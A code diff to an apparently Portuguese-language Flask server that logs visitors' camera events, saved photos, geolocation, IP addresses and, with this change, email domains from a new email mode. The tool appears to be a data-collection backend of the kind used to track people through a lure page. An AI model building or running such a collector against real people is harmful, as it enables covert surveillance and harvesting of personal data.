@@ -66,6 +66,9 @@ def mostrar_logs():
         if evento.get("google_maps") not in [None, "N/A"]:
             print(f"  🌍 Maps: {evento.get('google_maps')}")
 
+        if evento.get("email_domain") not in [None, "N/A"]:
+            print(f"  📧 Domínio: {evento.get('email_domain')}")
+
     print("")
 
 
@@ -78,6 +81,7 @@ def gerar_relatorio():
 
     total_camera = len([e for e in eventos if e.get("tipo") == "camera"])
     total_localizacao = len([e for e in eventos if e.get("tipo") == "localizacao"])
+    total_email = len([e for e in eventos if e.get("tipo") == "email"])
     total_permitidos = len([e for e in eventos if e.get("status") == "permitida"])
 
     nome = f"relatorios/relatorio_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt"
@@ -89,6 +93,7 @@ def gerar_relatorio():
         f.write(f"Total de eventos: {len(eventos)}\n")
         f.write(f"Eventos de câmera: {total_camera}\n")
         f.write(f"Eventos de localização: {total_localizacao}\n")
+        f.write(f"Eventos de e-mail/conta: {total_email}\n")
         f.write(f"Permissões concedidas: {total_permitidos}\n")
         f.write(f"Fotos locais salvas: {len(fotos)}\n\n")
 
@@ -146,6 +151,9 @@ def evento():
         if modo == "localizacao" and tipo != "localizacao":
             return jsonify({"status": "bloqueado"}), 403
 
+        if modo == "email" and tipo != "email":
+            return jsonify({"status": "bloqueado"}), 403
+
         evento_log = {
             "timestamp_servidor": datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
             "ip": request.remote_addr,
@@ -166,7 +174,7 @@ def evento():
         with open("logs/eventos.jsonl", "a", encoding="utf-8") as f:
             f.write(json.dumps(evento_log, ensure_ascii=False) + "\n")
 
-               print(f"\n[+] EVENTO REGISTRADO: {tipo} | {evento_log['status']} | IP: {request.remote_addr}")
+        print(f"\n[+] EVENTO REGISTRADO: {tipo} | {evento_log['status']} | IP: {request.remote_addr}")
 
         if tipo == "localizacao" and evento_log["latitude"] != "N/A":
             print(f"[+] Localização: {evento_log['latitude']}, {evento_log['longitude']}")
